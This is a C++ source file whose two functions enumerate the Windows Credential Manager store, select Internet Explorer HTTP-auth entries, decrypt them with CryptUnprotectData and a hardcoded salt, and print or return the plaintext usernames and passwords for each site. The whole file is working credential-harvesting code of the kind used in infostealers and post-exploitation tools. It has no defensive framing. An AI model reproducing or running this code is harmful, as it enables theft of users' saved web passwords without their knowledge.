#include "stdafx.h"

#pragma comment(lib, "Crypt32.lib")

void DecryptIEHttpAuthPasswords() {
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DATA_BLOB OptionalEntropy;
	short tmpSalt[37];
	char *strSalt={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};

	WCHAR strCredentials[1024];
	WCHAR strUsername[1024];
	WCHAR strPassword[1024];

	DBGPrint("Called\n");

	//Create the entropy/salt required for decryption...
	for (int i=0; i< 37; i++) {
		tmpSalt[i] = (short int)(strSalt[i] * 4);
	}

	OptionalEntropy.pbData = (BYTE *)&tmpSalt;
	OptionalEntropy.cbData = 74;

	DWORD Count;
	PCREDENTIAL *Credential;

	//Now enumerate all http stored credentials....
	if(CredEnumerate(NULL,0,&Count,&Credential)) {
		DBGPrint("Credential count: %d \n",Count);
		for(DWORD i=0;i<Count;i++) {
			DBGPrint("Credential type: %d Target Name: %s\n",Credential[i]->Type,Credential[i]->TargetName);
			if( (Credential[i]->Type == 1) && _strnicmp(Credential[i]->TargetName, "Microsoft_WinInet_", strlen("Microsoft_WinInet_") ) == 0 ) {
				DBGPrint("Match\n");
				DBGPrint("Target Alias %s\n",Credential[i]->TargetAlias);
				DBGPrint("Target UserName %s\n",Credential[i]->UserName);
		 
				DataIn.pbData = (BYTE *)Credential[i]->CredentialBlob;
				DataIn.cbData = Credential[i]->CredentialBlobSize;

				if(CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL,NULL,0,&DataOut)) {
					//Extract username & password from credentails (username:password)
					swprintf_s(strCredentials, 1024, L"%s", DataOut.pbData);
					DBGPrint("strCredentials%s\n",strCredentials);

					WCHAR *ptr = wcschr(strCredentials, L':');
					*ptr = L'\0';
					wcscpy_s(strUsername, 1024, strCredentials);
					ptr++;
					wcscpy_s(strPassword, 1024, ptr);

					DBGPrint("\n\n Website=%s\n Username=%s\n Password=%s", &Credential[i]->TargetName, strUsername, strPassword);
				} else {
					DBGPrint("Failed to unprotect creds: %d\n", GetLastError());
				}
			}
		} // End of FOR loop
		CredFree(Credential);
	}

  	DBGPrint("Returning\n\n");
}


BOOL GetCredsForSite(LPSTR lpSite, LPSTR *lpUserName, LPSTR *lpPassword) {
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DATA_BLOB OptionalEntropy;
	short tmpSalt[37];
	char *strSalt={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};

	BOOL bRetVal = FALSE;

	CHAR strCredentials[1024];
	CHAR strUsername[1024];
	CHAR strPassword[1024];

	DBGPrint("Called\n");
	DBGPrint("Site: %s\n",lpSite);

	if(!lpSite){
		return bRetVal;
	}

	//Create the entropy/salt required for decryption...
	for (int i=0; i< 37; i++) {
		tmpSalt[i] = (short int)(strSalt[i] * 4);
	}

	OptionalEntropy.pbData = (BYTE *)&tmpSalt;
	OptionalEntropy.cbData = 74;

	DWORD Count;
	DWORD len = 0;
	PCREDENTIAL *Credential;

	//Now enumerate all http stored credentials....
	if (CredEnumerate(NULL,0,&Count,&Credential)) {
		DBGPrint("Credential count: %d \n",Count);
		for(DWORD i=0;i<Count;i++) {
			DBGPrint("Credential type: %d Target Name: %s\n",Credential[i]->Type,Credential[i]->TargetName);
			if( (Credential[i]->Type == 1) && strstr(Credential[i]->TargetName, lpSite) != NULL ) {
				DBGPrint("Match\n");
				DBGPrint("Target Alias %s\n",Credential[i]->TargetAlias);
				DBGPrint("Target UserName %s\n",Credential[i]->UserName);
		 
				DataIn.pbData = (BYTE *)Credential[i]->CredentialBlob;
				DataIn.cbData = Credential[i]->CredentialBlobSize;

				if (CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL,NULL,0,&DataOut)) {
					//Extract username & password from credentails (username:password)
					sprintf_s(strCredentials, 1024, "%s", DataOut.pbData);
					DBGPrint("strCredentials%s\n",strCredentials);

					CHAR *ptr = strchr(strCredentials, ':');
					*ptr = '\0';
					strcpy_s(strUsername, 1024, strCredentials);
					len = ( strlen(strCredentials) + 1 ) * sizeof(CHAR);
					*lpUserName = (LPSTR ) GlobalAlloc(GPTR,len );
					strcpy_s(*lpUserName,len,strCredentials);

					ptr++;
					strcpy_s(strPassword, 1024, ptr);
					len = (strlen(strPassword) + 1 ) * sizeof(CHAR);
					*lpPassword = (LPSTR) GlobalAlloc(GPTR,len);
					strcpy_s(*lpPassword,len,ptr);

					DBGPrint("\n\n Website=%s\n Username=%s\n Password=%s", &Credential[i]->TargetName, lpUserName, lpPassword);
		
					bRetVal = TRUE;
			
					break;
				} else {
					DBGPrint("Failed to unprotect creds: %d\n", GetLastError());
				}
			}
		} // End of FOR loop

		CredFree(Credential);
	}

  	DBGPrint("Returning\n\n");
	return bRetVal;
} //End of function